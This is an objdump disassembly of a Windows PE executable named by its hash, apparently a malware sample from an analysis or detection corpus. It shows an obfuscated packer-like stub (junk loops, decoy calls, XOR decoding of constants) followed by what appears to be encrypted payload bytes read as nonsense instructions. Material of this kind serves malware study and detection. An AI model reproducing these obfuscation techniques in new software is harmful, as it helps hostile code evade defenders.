
9b869dec9ca84e92a237f1de8334851b20a518c6be5e5ff2c50fbaf36a38137a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	push   ebx
  40100d:	movzx  ecx,WORD PTR ds:0x426e89
  401014:	or     DWORD PTR ds:0x426eb9,ecx
  40101a:	push   esi
  40101b:	add    ecx,0x2a4c
  401021:	push   edi
  401022:	mov    esi,0x75108b3
  401027:	xor    eax,esi
  401029:	mov    edi,0x3272fa
  40102e:	add    eax,edi
  401030:	mov    DWORD PTR [ebp-0x40],eax
  401033:	xor    eax,ecx
  401035:	mov    eax,ds:0x426149
  40103a:	mov    eax,DWORD PTR [eax]
  40103c:	sbb    ecx,0x1729
  401042:	mov    DWORD PTR [ebp-0x3c],eax
  401045:	and    DWORD PTR ds:0x426ec5,0x0
  40104f:	mov    ecx,DWORD PTR ds:0x426ec5
  401055:	inc    ecx
  401056:	mov    DWORD PTR ds:0x426ec5,ecx
  40105c:	cmp    DWORD PTR ds:0x426ec5,0x24
  401063:	jbe    0x401081
  401069:	jmp    0x401074
  40106e:	call   DWORD PTR ds:0x430a00
  401074:	cmp    DWORD PTR ds:0x426ec5,0x1d
  40107b:	jb     0x40104f
  401081:	mov    eax,ds:0x426359
  401086:	dec    ecx
  401087:	mov    eax,DWORD PTR [eax]
  401089:	dec    ecx
  40108a:	mov    DWORD PTR [ebp-0x1c],eax
  40108d:	mov    DWORD PTR [ebp-0x34],0xf89c87b5
  401094:	sub    DWORD PTR ds:0x426f05,0x3e68
  40109e:	mov    eax,DWORD PTR [ebp-0x34]
  4010a1:	xor    eax,esi
  4010a3:	add    eax,edi
  4010a5:	mov    DWORD PTR [ebp-0x40],eax
  4010a8:	movzx  ecx,WORD PTR ds:0x426f19
  4010af:	sbb    DWORD PTR ds:0x426f05,ecx
  4010b5:	mov    eax,ds:0x4262c9
  4010ba:	mov    DWORD PTR [ebp-0x40],eax
  4010bd:	or     DWORD PTR ds:0x426ee1,0xb11
  4010c7:	mov    eax,DWORD PTR [ebp-0x3c]
  4010ca:	adc    DWORD PTR ds:0x426f05,0x426f01
  4010d4:	mov    DWORD PTR [ebp-0x14],eax
  4010d7:	sub    DWORD PTR ds:0x426ebd,ecx
  4010dd:	mov    eax,DWORD PTR [ebp-0x14]
  4010e0:	push   0x4
  4010e2:	adc    ecx,0x19c9
  4010e8:	pop    ecx
  4010e9:	or     DWORD PTR ds:0x426e85,0x426ee5
  4010f3:	sub    ecx,eax
  4010f5:	add    ecx,DWORD PTR [ebp-0x1c]
  4010f8:	sbb    eax,DWORD PTR ds:0x426f01
  4010fe:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  401105:	mov    DWORD PTR [ebp-0x18],ecx
  401108:	mov    eax,ds:0x426e99
  40110d:	or     DWORD PTR ds:0x426f05,eax
  401113:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  40111d:	and    DWORD PTR ds:0x426e81,0x0
  401127:	xor    eax,eax
  401129:	xor    eax,DWORD PTR ds:0x426e81
  40112f:	inc    eax
  401130:	mov    ds:0x426e81,eax
  401135:	cmp    DWORD PTR ds:0x426e81,0x25
  40113c:	jg     0x40117d
  401142:	jmp    0x401170
  401147:	push   DWORD PTR [ebp-0x28]
  40114a:	push   0x1250
  40114f:	push   DWORD PTR [ebp-0x14]
  401152:	push   DWORD PTR [ebp-0x10]
  401155:	push   DWORD PTR [ebp-0x14]
  401158:	push   0x2a2f
  40115d:	push   0x822a
  401162:	push   DWORD PTR [ebp-0x18]
  401165:	push   0x79ea
  40116a:	call   DWORD PTR ds:0x430a04
  401170:	cmp    DWORD PTR ds:0x426e81,0x1e
  401177:	jb     0x401127
  40117d:	mov    eax,DWORD PTR [ebp-0x14]
  401180:	adc    DWORD PTR ds:0x426ee5,0x426ecd
  40118a:	mov    DWORD PTR [ebp-0x9c],eax
  401190:	mov    eax,ds:0x426ec5
  401195:	add    DWORD PTR ds:0x426ebd,eax
  40119b:	mov    eax,DWORD PTR [ebp-0x18]
  40119e:	mov    DWORD PTR [ebp-0x98],eax
  4011a4:	mov    eax,DWORD PTR [ebp-0x2c]
  4011a7:	inc    DWORD PTR ds:0x426edd
  4011ad:	xor    eax,esi
  4011af:	sbb    DWORD PTR ds:0x426eed,0x426e95
  4011b9:	add    eax,edi
  4011bb:	mov    DWORD PTR [ebp-0x94],eax
  4011c1:	lea    eax,[ebp-0x48]
  4011c4:	mov    DWORD PTR [ebp-0x90],eax
  4011ca:	sub    DWORD PTR ds:0x426f15,ecx
  4011d0:	mov    eax,DWORD PTR [ebp-0xa0]
  4011d6:	xor    eax,esi
  4011d8:	and    DWORD PTR ds:0x426ef1,0x42a0
  4011e2:	add    eax,edi
  4011e4:	mov    DWORD PTR [ebp-0xa0],eax
  4011ea:	sub    DWORD PTR ds:0x426f11,0x426e99
  4011f4:	lea    eax,[ebp-0xa0]
  4011fa:	mov    DWORD PTR ds:0x426f11,0x134d
  401204:	push   eax
  401205:	and    eax,0x6f55
  40120a:	mov    eax,DWORD PTR [ebp+0xc]
  40120d:	adc    DWORD PTR ds:0x426e91,0x426f11
  401217:	xor    eax,esi
  401219:	add    eax,edi
  40121b:	mov    DWORD PTR ds:0x426e81,0x195a
  401225:	push   eax
  401226:	mov    eax,ds:0x426f1d
  40122b:	xor    eax,DWORD PTR ds:0x426f0d
  401231:	mov    ds:0x426f1d,eax
  401236:	mov    eax,ds:0x4262e9
  40123b:	adc    DWORD PTR ds:0x426ee5,0x426ec5
  401245:	push   0x42623f
  40124a:	add    DWORD PTR ds:0x426ed1,0x1712
  401254:	push   DWORD PTR [eax]
  401256:	adc    DWORD PTR ds:0x426e91,0x17d3
  401260:	call   0x408594
  401265:	mov    DWORD PTR ds:0x426ee1,0x12
  40126f:	cmp    DWORD PTR ds:0x426ee1,0x0
  401276:	je     0x4012bc
  40127c:	cmp    DWORD PTR ds:0x426ee1,0x4
  401283:	ja     0x4012bc
  401289:	jmp    0x401294
  40128e:	call   DWORD PTR ds:0x430a08
  401294:	cmp    DWORD PTR ds:0x426ee1,0x5
  40129b:	jne    0x4012ac
  4012a1:	mov    eax,ds:0x426ee1
  4012a6:	dec    eax
  4012a7:	mov    ds:0x426ee1,eax
  4012ac:	mov    eax,ds:0x426ee1
  4012b1:	dec    eax
  4012b2:	mov    ds:0x426ee1,eax
  4012b7:	jmp    0x40126f
  4012bc:	mov    ebx,DWORD PTR [ebp-0x14]
  4012bf:	dec    eax
  4012c0:	mov    eax,DWORD PTR [ebp-0x18]
  4012c3:	sub    edx,0x53c
  4012c9:	mov    DWORD PTR [ebp-0x58],eax
  4012cc:	and    DWORD PTR ds:0x426f2d,0x0
  4012d6:	mov    eax,ds:0x426f2d
  4012db:	inc    eax
  4012dc:	mov    ds:0x426f2d,eax
  4012e1:	cmp    DWORD PTR ds:0x426f2d,0x1f
  4012e8:	ja     0x401309
  4012ee:	jmp    0x4012fc
  4012f3:	push   DWORD PTR [ebp-0x18]
  4012f6:	call   DWORD PTR ds:0x430a0c
  4012fc:	cmp    DWORD PTR ds:0x426f2d,0x15
  401303:	jb     0x4012d6
  401309:	mov    DWORD PTR [ebp-0x34],0xf89c8522
  401310:	xor    DWORD PTR ds:0x426ec1,ecx
  401316:	mov    eax,0xf89c85bb
  40131b:	inc    edx
  40131c:	mov    DWORD PTR [ebp-0x1c],eax
  40131f:	lea    ecx,[eax-0x6]
  401322:	sub    DWORD PTR ds:0x426e89,edx
  401328:	mov    DWORD PTR [ebp-0x28],ecx
  40132b:	mov    DWORD PTR ds:0x426f2d,0x18
  401335:	cmp    DWORD PTR ds:0x426f2d,0x0
  40133c:	je     0x401386
  401342:	cmp    DWORD PTR ds:0x426f2d,0xb
  401349:	jbe    0x401386
  40134f:	jmp    0x40135a
  401354:	call   DWORD PTR ds:0x430a38
  40135a:	cmp    DWORD PTR ds:0x426f2d,0xc
  401361:	jne    0x401374
  401367:	mov    edx,DWORD PTR ds:0x426f2d
  40136d:	dec    edx
  40136e:	mov    DWORD PTR ds:0x426f2d,edx
  401374:	mov    edx,DWORD PTR ds:0x426f2d
  40137a:	dec    edx
  40137b:	mov    DWORD PTR ds:0x426f2d,edx
  401381:	jmp    0x401335
  401386:	mov    DWORD PTR [ebp-0x10],0xf89c85b4
  40138d:	mov    DWORD PTR [ebp-0x8],eax
  401390:	mov    eax,DWORD PTR [ebp-0x10]
  401393:	and    DWORD PTR ds:0x426f01,0x0
  40139d:	mov    edx,DWORD PTR ds:0x426f01
  4013a3:	inc    edx
  4013a4:	mov    DWORD PTR ds:0x426f01,edx
  4013aa:	cmp    DWORD PTR ds:0x426f01,0x21
  4013b1:	jle    0x4013d4
  4013b7:	jmp    0x4013c7
  4013bc:	push   0x575d
  4013c1:	call   DWORD PTR ds:0x430a3c
  4013c7:	cmp    DWORD PTR ds:0x426f01,0x11
  4013ce:	jb     0x40139d
  4013d4:	xor    eax,esi
  4013d6:	inc    edx
  4013d7:	mov    edx,0xffcd8d87
  4013dc:	adc    DWORD PTR ds:0x426ea1,0x426ef5
  4013e6:	sub    edx,eax
  4013e8:	mov    DWORD PTR [ebp-0xc],edx
  4013eb:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4013f2:	mov    eax,DWORD PTR [ebp-0x8]
  4013f5:	mov    DWORD PTR [ebp-0x3c],ebx
  4013f8:	cmp    eax,ecx
  4013fa:	mov    DWORD PTR ds:0x426e9d,0x528e
  401404:	je     0x403b99
  40140a:	mov    DWORD PTR ds:0x426e95,0x15
  401414:	cmp    DWORD PTR ds:0x426e95,0x0
  40141b:	je     0x401463
  401421:	cmp    DWORD PTR ds:0x426e95,0x19
  401428:	jge    0x401463
  40142e:	jmp    0x401451
  401433:	push   0x426ef9
  401438:	push   0x4b8b
  40143d:	push   DWORD PTR [ebp-0x24]
  401440:	push   0x61ed
  401445:	push   DWORD PTR [ebp-0xc]
  401448:	push   DWORD PTR [ebp-0x1c]
  40144b:	call   DWORD PTR ds:0x430a40
  401451:	mov    ecx,DWORD PTR ds:0x426e95
  401457:	dec    ecx
  401458:	mov    DWORD PTR ds:0x426e95,ecx
  40145e:	jmp    0x401414
  401463:	mov    eax,DWORD PTR [ebp-0x10]
  401466:	and    DWORD PTR ds:0x426e91,0x0
  401470:	jmp    0x401482
  401475:	mov    ecx,DWORD PTR ds:0x426e91
  40147b:	inc    ecx
  40147c:	mov    DWORD PTR ds:0x426e91,ecx
  401482:	cmp    DWORD PTR ds:0x426e91,0x1c
  401489:	jae    0x4014e4
  40148f:	cmp    DWORD PTR ds:0x426e91,0xe
  401496:	jle    0x4014e4
  40149c:	jmp    0x4014c3
  4014a1:	push   0x419a
  4014a6:	push   0x5df1
  4014ab:	push   DWORD PTR [ebp-0x1c]
  4014ae:	push   DWORD PTR [ebp-0xc]
  4014b1:	push   DWORD PTR [ebp-0x18]
  4014b4:	push   DWORD PTR [ebp-0x10]
  4014b7:	push   DWORD PTR [ebp-0x20]
  4014ba:	push   DWORD PTR [ebp-0x28]
  4014bd:	call   DWORD PTR ds:0x430a10
  4014c3:	cmp    DWORD PTR ds:0x426e91,0xd
  4014ca:	jne    0x4014df
  4014d0:	xor    ecx,ecx
  4014d2:	or     ecx,DWORD PTR ds:0x426e91
  4014d8:	inc    ecx
  4014d9:	mov    DWORD PTR ds:0x426e91,ecx
  4014df:	jmp    0x401475
  4014e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4014e7:	xor    eax,esi
  4014e9:	xor    ecx,esi
  4014eb:	xor    DWORD PTR ds:0x426ef1,0x66eb
  4014f5:	lea    ecx,[eax+ecx*1+0x64e5f4]
  4014fc:	or     eax,0x4514
  401501:	mov    eax,DWORD PTR [ebp-0xc]
  401504:	xor    edx,edx
  401506:	sbb    DWORD PTR ds:0x426f0d,0x523c
  401510:	div    ecx
  401512:	mov    eax,DWORD PTR [ebp-0x8]
  401515:	and    DWORD PTR ds:0x426ea9,0x0
  40151f:	mov    ecx,DWORD PTR ds:0x426ea9
  401525:	inc    ecx
  401526:	mov    DWORD PTR ds:0x426ea9,ecx
  40152c:	cmp    DWORD PTR ds:0x426ea9,0xa
  401533:	jg     0x403903
  401539:	jmp    0x401544
  40153e:	call   DWORD PTR ds:0x430a14
  401544:	cmp    DWORD PTR ds:0x426ea9,0x9
  40154b:	jne    0x40155e
  401551:	mov    ecx,DWORD PTR ds:0x426ea9
  401557:	inc    ecx
  401558:	mov    DWORD PTR ds:0x426ea9,ecx
  40155e:	cmp    DWORD PTR ds:0x426ea9,0x10
  401565:	jb     0x40151f
  40156b:	jmp    0x403903
  401570:	sub    BYTE PTR [esi+0x1],ah
  401573:	mov    eax,ds:0x6628e841
  401578:	pop    es
  401579:	and    eax,0x4d74c454
  40157e:	aam    0x7a
  401580:	jnp    0x4015fd
  401582:	jnp    0x4015ff
  401584:	hlt    
  401585:	pushf  
  401586:	jnp    0x401603
  401588:	ror    ch,cl
  40158a:	aam    0xbe
  40158c:	(bad)  
  40158d:	ret    0xccd8
  401590:	add    cl,0x86
  401593:	xchg   esp,eax
  401595:	mov    cl,BYTE PTR [edx+0x22b38a8b]
  40159b:	sbb    eax,0x88a991fe
  4015a0:	jle    0x40153a
  4015a2:	push   ecx
  4015a3:	or     DWORD PTR [edx-0x5465d36a],0x64fb6dc1
  4015ad:	ja     0x401543
  4015af:	stos   BYTE PTR es:[edi],al
  4015b0:	jl     0x401566
  4015b2:	jno    0x4015fb
  4015b4:	jl     0x4015f7
  4015b6:	inc    ebx
  4015b7:	mov    eax,0x1d87fccd
  4015bc:	sti    
  4015bd:	nop
  4015be:	jl     0x40159f
  4015c0:	or     dh,BYTE PTR [esi+0x640a3b2a]
  4015c6:	rcr    BYTE PTR [edi],1
  4015c8:	push   0x4896ecc6
  4015cd:	imul   esp,DWORD PTR ds:0xe51a8af4,0x15
  4015d4:	out    dx,eax
  4015d5:	sti    
  4015d6:	(bad)  
  4015d7:	fldcw  WORD PTR [ecx-0x76773813]
  4015dd:	ss dec esp
  4015df:	rcr    BYTE PTR [esi+0x6fc47e2],1
  4015e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e6:	enter  0xb375,0x29
  4015ea:	cwde   
  4015eb:	neg    bl
  4015ed:	sti    
  4015ee:	jns    0x40162e
  4015f0:	sbb    BYTE PTR [edx],0x59
  4015f3:	pushf  
  4015f4:	push   0x63d5e43e
  4015f9:	scas   al,BYTE PTR es:[edi]
  4015fa:	lock pop edi
  4015fc:	mov    ebp,0x1be87073
  401601:	retf   0x6a93
  401604:	mov    ch,0xb0
  401606:	xchg   ebp,eax
  401607:	add    BYTE PTR [ebx+ebp*2],ch
  40160a:	(bad)  
  40160b:	xor    WORD PTR [ebp*1-0x5dfa7197],si
  401613:	xchg   ebx,eax
  401614:	lods   eax,DWORD PTR ds:[esi]
  401615:	in     eax,dx
  401616:	mov    edi,0x4ae0b7f0
  40161b:	test   al,0x2b
  40161d:	inc    esp
  40161e:	mov    cl,0x21
  401620:	in     eax,0x97
  401622:	cli    
  401623:	xchg   ebx,eax
  401624:	xchg   edi,eax
  401625:	inc    edx
  401626:	test   BYTE PTR [ecx-0x1e5c06c4],0x3b
  40162d:	loop   0x40168f
  40162f:	cs nop
  401631:	in     al,dx
  401632:	stos   BYTE PTR es:[edi],al
  401633:	dec    esp
  401634:	cmp    BYTE PTR [esi+0x30],0xe4
  401638:	sbb    DWORD PTR [edi],eax
  40163a:	ja     0x401600
  40163c:	xor    esp,ecx
  40163e:	xchg   esp,eax
  40163f:	(bad)  
  401640:	adc    eax,0x503e9513
  401645:	jnp    0x40160b
  401647:	call   0x5ceb:0xc61130e
  40164e:	sbb    eax,0x5c0417cd
  401653:	in     eax,dx
  401654:	lock mov DWORD PTR [ecx+0x43f3ddf9],0x3264e5e0
  40165f:	sti    
  401660:	xor    al,0x91
  401662:	imul   ecx,DWORD PTR [ecx-0x1],0x77
  401666:	push   0x8
  401668:	push   ebx
  401669:	lods   al,BYTE PTR ds:[esi]
  40166a:	push   ebp
  40166b:	inc    esp
  40166c:	mov    esi,0x99c8d515
  401671:	stc    
  401672:	adc    bl,BYTE PTR [esi-0x54]
  401675:	retf   0x6596
  401678:	push   cs
  401679:	ins    BYTE PTR es:[edi],dx
  40167a:	sub    al,0x6b
  40167c:	inc    edx
  40167d:	inc    esi
  40167e:	push   cs
  40167f:	int3   
  401680:	sub    bh,BYTE PTR [eax+ebx*8+0x37]
  401684:	repz pushf 
  401686:	outs   dx,BYTE PTR ds:[esi]
  401687:	popf   
  401688:	push   0x9a184bf6
  40168d:	cmp    BYTE PTR gs:[edi-0x16],ch
  401691:	and    esp,edi
  401693:	in     al,0x7a
  401695:	sub    ecx,edi
  401697:	pop    eax
  401698:	outs   dx,DWORD PTR ds:[esi]
  401699:	ins    BYTE PTR es:[edi],dx
  40169a:	aaa    
  40169b:	shr    dl,cl
  40169d:	fistp  WORD PTR [ebp-0x32232483]
  4016a3:	outs   dx,BYTE PTR ds:[esi]
  4016a5:	call   0x32448cf4
  4016aa:	stc    
  4016ab:	jmp    0xe77dfd15
  4016b0:	mov    al,ds:0x93707428
  4016b5:	leave  
  4016b6:	(bad)  
  4016b7:	int3   
  4016b8:	xor    BYTE PTR [eax+0x1d0446f0],dl
  4016be:	sbb    BYTE PTR [esi-0x48131327],ah
  4016c4:	jmp    0xbe2c:0x2b0408c8
  4016cb:	je     0x40173e
  4016cd:	fnstsw WORD PTR [esi]
  4016cf:	jb     0x4016b2
  4016d1:	and    eax,0x7d0ff1ae
  4016d6:	dec    edx
  4016d7:	stc    
  4016d8:	into   
  4016d9:	jne    0x4016c0
  4016db:	pop    ebx
  4016dc:	fnstsw WORD PTR [eax+ecx*8-0x20fec35e]
  4016e3:	fstp   TBYTE PTR [ebx-0x64]
  4016e6:	jp     0x4016c9
  4016e8:	rcl    BYTE PTR [ebx*8-0x43112746],0x8
  4016f0:	push   cs
  4016f1:	jnp    0x40167d
  4016f3:	mov    esi,0x126d0953
  4016f8:	arpl   bx,si
  4016fa:	add    cl,dl
  4016fc:	jb     0x4016ea
  4016fe:	dec    edx
  4016ff:	xchg   cl,bh
  401701:	fistp  DWORD PTR [edx]
  401703:	pushf  
  401704:	jno    0x4016df
  401706:	test   DWORD PTR [edx],edx
  401708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401709:	mov    ebp,0x2be3396b
  40170e:	test   al,0x41
  401710:	stos   BYTE PTR es:[edi],al
  401711:	xchg   ebp,eax
  401712:	lods   eax,DWORD PTR ds:[esi]
  401713:	jo     0x4016ed
  401715:	nop
  401716:	add    cl,BYTE PTR [edi+0x5c]
  401719:	sbb    eax,DWORD PTR [edx-0x6bc0cd05]
  40171f:	mov    al,0x2a
  401721:	sbb    bl,ah
  401723:	enter  0x11a5,0xa2
  401727:	add    BYTE PTR [eax-0x3a4bf190],ch
  40172d:	hlt    
  40172e:	rcl    ecx,1
  401730:	jecxz  0x4016ed
  401732:	adc    DWORD PTR [ecx-0x32],0xb161239e
  401739:	imul   DWORD PTR [edx-0x8]
  40173c:	jmp    0x4016f1
  40173e:	repz clc 
  401740:	push   edx
  401741:	and    DWORD PTR [eax+0x2d],eax
  401744:	or     dh,cl
  401746:	inc    ebp
  401747:	add    ah,ch
  401749:	mov    DWORD PTR [esi+0x25bc6e4],edx
  40174f:	test   al,0xe8
  401751:	arpl   WORD PTR ds:0xc59d7e0f,bp
  401757:	(bad)  
  401758:	cli    
  401759:	cs (bad) 
  40175c:	int3   
  40175d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40175e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40175f:	mov    eax,ecx
  401761:	mov    bl,0x48
  401763:	std    
  401764:	sub    cl,BYTE PTR [ebp-0x2222b69a]
  40176a:	mov    esp,0x84f85578
  40176f:	bt     DWORD PTR [ecx-0x3c],ebx
  401773:	jno    0x40178b
  401775:	mov    WORD PTR [esi+0x40c29f52],es
  40177b:	and    eax,0xd5004caa
  401780:	in     eax,0x70
  401782:	mov    ?,WORD PTR [edi+0x74ce4d14]
  401788:	dec    esi
  401789:	mov    esp,0x40a7f343
  40178e:	aam    0xc0
  401790:	cdq    
  401791:	retf   
  401792:	xchg   esp,eax
  401793:	mov    ebp,0xd988cdd
  401798:	fs pop eax
  40179a:	xor    BYTE PTR [edi+0x56],ch
  40179d:	popf   
  40179e:	pop    edx
  40179f:	leave  
  4017a0:	xchg   ecx,eax
  4017a1:	pop    esi
  4017a2:	nop
  4017a3:	ins    DWORD PTR es:[edi],dx
  4017a4:	push   ebx
  4017a5:	mov    ds:0xa86d83cc,eax
  4017aa:	adc    al,0x24
  4017ac:	jb     0x40179a
  4017ae:	fldenv [esi-0x5e9afbff]
  4017b4:	repz or BYTE PTR [edx-0x4f],bh
  4017b8:	inc    edx
  4017b9:	pop    ebp
  4017ba:	pop    esi
  4017bb:	pop    edx
  4017bc:	lahf   
  4017bd:	into   
  4017be:	shl    BYTE PTR [edi],cl
  4017c0:	xor    al,0x63
  4017c2:	adc    edx,DWORD PTR [eax]
  4017c4:	js     0x4017ad
  4017c6:	add    eax,0xe8dd135e
  4017cb:	aas    
  4017cc:	lea    ebx,[esi-0x3b3cac04]
  4017d2:	cdq    
  4017d3:	dec    ebp
  4017d4:	stc    
  4017d5:	mov    eax,0x52ab346e
  4017da:	mov    WORD PTR [ecx+0x31d90d6],ss
  4017e0:	cmc    
  4017e1:	push   es
  4017e2:	adc    BYTE PTR [eax],dl
  4017e4:	lahf   
  4017e5:	scas   al,BYTE PTR es:[edi]
  4017e6:	dec    esi
  4017e7:	std    
  4017e8:	dec    edx
  4017e9:	push   ebp
  4017ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017eb:	sti    
  4017ec:	stos   DWORD PTR es:[edi],eax
  4017ed:	mov    ch,0x5f
  4017ef:	cmc    
  4017f0:	adc    al,0xc1
  4017f2:	lds    ecx,FWORD PTR [ebx-0x8d09a17]
  4017f8:	push   ss
  4017f9:	lock imul edi,ebx,0xf2bf82f
  401800:	ss inc ebx
  401802:	mov    ah,BYTE PTR [eax-0x50043331]
  401808:	in     eax,dx
  401809:	repz in al,dx
  40180b:	std    
  40180c:	cmp    eax,esp
  40180e:	pop    ebp
  40180f:	leave  
  401810:	xchg   edx,eax
  401811:	jno    0x401860
  401813:	dec    eax
  401814:	iret   
  401815:	mov    DWORD PTR [edi-0x44],0xda5b1807
  40181c:	push   0x2e
  40181e:	stc    
  40181f:	cmp    esp,DWORD PTR [esi+edi*2+0x5c281592]
  401826:	and    eax,0x68528c41
  40182b:	and    DWORD PTR [edx],esi
  40182d:	test   al,0x84
  40182f:	or     ecx,eax
  401831:	push   edi
  401832:	or     BYTE PTR [eax+0x2921de79],dl
  401838:	aad    0xbf
  40183a:	inc    esi
  40183b:	pop    edi
  40183c:	xor    bh,BYTE PTR [eax+0x3e]
  40183f:	(bad)  
  401840:	cdq    
  401841:	cmp    bl,bh
  401843:	or     eax,0xeb65c0f2
  401848:	lods   al,BYTE PTR ds:[esi]
  401849:	ret    0x3eb9
  40184c:	cli    
  40184d:	nop
  40184e:	sub    ah,bl
  401850:	and    DWORD PTR [esi],edi
  401852:	rep ins DWORD PTR es:[edi],dx
  401854:	(bad)  
  401855:	pop    eax
  401856:	fiadd  WORD PTR [ebx+esi*1+0x6b7bc426]
  40185d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40185e:	stos   BYTE PTR es:[edi],al
  40185f:	push   cs
  401860:	mov    cl,0x3a
  401862:	clc    
  401863:	push   ecx
  401864:	push   edx
  401865:	scas   al,BYTE PTR es:[edi]
  401866:	pop    ds
  401867:	(bad)  
  401868:	cmp    edi,ebx
  40186a:	xchg   ebx,eax
  40186b:	sub    edi,eax
  40186d:	jns    0x4018b1
  40186f:	daa    
  401870:	outs   dx,DWORD PTR ds:[esi]
  401871:	sysenter 
  401873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401874:	cmp    BYTE PTR [ebx+0x6ca4c976],0x92
  40187b:	out    dx,al
  40187c:	sub    al,0xef
  40187e:	adc    DWORD PTR [ebx-0x6df96b3],edi
  401884:	mov    eax,ds:0x38464ae0
  401889:	xchg   esp,eax
  40188a:	out    dx,al
  40188b:	sub    BYTE PTR [edx+0x10926189],ah
  401891:	inc    ebx
  401892:	test   BYTE PTR [edi+esi*2+0x52],0xa1
  401897:	mov    dl,0x11
  401899:	mov    WORD PTR ss:[edx+0x7abc1f7f],ss
  4018a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018a1:	inc    edi
  4018a2:	repnz gs mov cl,0x5b
  4018a6:	mov    eax,0x82f2b7b0
  4018ab:	ss push edx
  4018ad:	jecxz  0x401901
  4018af:	inc    edi
  4018b0:	jecxz  0x4018b0
  4018b2:	dec    esp
  4018b3:	jg     0x40187d
  4018b5:	jg     0x4018d9
  4018b7:	outs   dx,DWORD PTR ds:[esi]
  4018b8:	data16 test al,0x88
  4018bb:	repnz mov dh,0x81
  4018be:	add    al,0x4a
  4018c0:	jp     0x401894
  4018c2:	cmp    edx,eax
  4018c4:	std    
  4018c5:	test   al,0x79
  4018c7:	je     0x4018c4
  4018c9:	mov    al,ds:0x28fb5b07
  4018ce:	mov    ss,eax
  4018d0:	into   
  4018d1:	mov    dl,0xf6
  4018d3:	or     edx,DWORD PTR [esi-0x2c]
  4018d6:	mov    ebp,0x648948b8
  4018db:	icebp  
  4018dc:	xor    BYTE PTR [edi+0x2befe522],bl
  4018e2:	into   
  4018e3:	in     eax,dx
  4018e4:	mov    esi,ecx
  4018e6:	mov    ds:0x5d99e39e,al
  4018eb:	cmp    al,0xc7
  4018ed:	cmp    BYTE PTR [esi],ch
  4018ef:	pop    ebx
  4018f0:	mov    ds:0x9b1b56cc,eax
  4018f5:	outs   dx,BYTE PTR ds:[esi]
  4018f6:	xor    cl,bl
  4018f8:	xchg   DWORD PTR ds:0x539f757c,ebp
  4018fe:	fwait
  4018ff:	cmp    edx,0xe98260ad
  401905:	out    0xa7,al
  401907:	mov    ebp,0x4f9d6fba
  40190c:	cdq    
  40190d:	xchg   ecx,eax
  40190e:	push   ebp
  40190f:	dec    esi
  401910:	ins    BYTE PTR es:[edi],dx
  401911:	int    0x1f
  401913:	test   BYTE PTR [ebx],al
  401915:	pop    esi
  401916:	ffree  st(0)
  401918:	mov    esi,0x929cb259
  40191d:	out    dx,al
  40191e:	xlat   BYTE PTR ds:[ebx]
  40191f:	pop    edi
  401920:	jge    0x401978
  401922:	mov    dh,0xfd
  401924:	add    DWORD PTR [ecx-0x44],esi
  401927:	clc    
  401928:	test   al,0xbf
  40192a:	mov    al,ds:0xaccf6c9d
  40192f:	pushf  
  401930:	mov    al,0xb9
  401932:	aaa    
  401933:	retf   
  401934:	pop    edx
  401935:	sbb    al,0x94
  401937:	mov    dh,0x0
  401939:	inc    ebx
  40193a:	xor    BYTE PTR [ebx],dh
  40193c:	push   eax
  40193d:	sub    DWORD PTR [ebp-0x7acc2416],esp
  401943:	push   edi
  401944:	push   edi
  401945:	or     edi,DWORD PTR [ebx]
  401947:	test   al,dl
  401949:	addr16 inc ebp
  40194b:	test   DWORD PTR [esi-0x79617dc],0x7e95a87
  401955:	in     al,dx
  401956:	mov    ebp,0x98b23aca
  40195b:	inc    esp
  40195c:	(bad)  
  40195d:	aam    0xf3
  40195f:	pop    ds
  401960:	xlat   BYTE PTR ds:[ebx]
  401961:	jne    0x4019e1
  401963:	xor    DWORD PTR [ebp+0x6d],eax
  401966:	jo     0x40192f
  401968:	mov    edi,0xaabd9e7d
  40196d:	xor    DWORD PTR [ebx],0xe75c03f3
  401973:	inc    edi
  401974:	sbb    ecx,edi
  401976:	sbb    BYTE PTR [edi-0x9],ah
  401979:	mov    WORD PTR [edi-0x4842df10],?
  40197f:	repnz in eax,0xbc
  401982:	cmc    
  401983:	(bad)  
  401984:	cld    
  401985:	outs   dx,DWORD PTR ds:[esi]
  401986:	mov    esp,0xc83f917b
  40198b:	(bad)  
  40198c:	mov    ah,0x86
  40198e:	int    0xdb
  401990:	jg     0x4019ac
  401992:	nop
  401993:	pop    edi
  401994:	mov    al,0x64
  401996:	cmp    DWORD PTR [ebx+ecx*4-0x13ceccad],esp
  40199d:	add    ch,ch
  40199f:	mov    ebx,0x4746a9c0
  4019a4:	or     DWORD PTR [eax-0x52c98127],esi
  4019aa:	inc    edi
  4019ab:	jl     0x401930
  4019ad:	(bad)  
  4019ae:	dec    edi
  4019af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019b0:	cmp    eax,0x623c7021
  4019b5:	ficomp WORD PTR [edi*2-0x1ac0407e]
  4019bc:	push   ss
  4019bd:	ror    BYTE PTR [edx-0x7a37751],cl
  4019c3:	mov    ds:0x9b47beea,al
  4019c8:	adc    BYTE PTR [ebp+esi*2-0x15],ah
  4019cc:	and    eax,0x5b541c34
  4019d1:	or     dl,BYTE PTR [edx+edx*2+0x25]
  4019d5:	fnsave ds:0xe8bc6803
  4019db:	pop    DWORD PTR [edx]
  4019dd:	xor    eax,esi
  4019df:	and    DWORD PTR [esi],edi
  4019e1:	lock mov ecx,0xa40fc112
  4019e7:	adc    BYTE PTR [ebx+0x4031f102],cl
  4019ed:	(bad)  
  4019ee:	hlt    
  4019ef:	rcr    BYTE PTR ds:0x5ff882e5,cl
  4019f5:	mov    esi,0x21da4df0
  4019fa:	jle    0x401980
  4019fc:	xor    edx,esp
  4019fe:	lea    esi,[ecx]
  401a00:	(bad)  
  401a01:	pop    ds
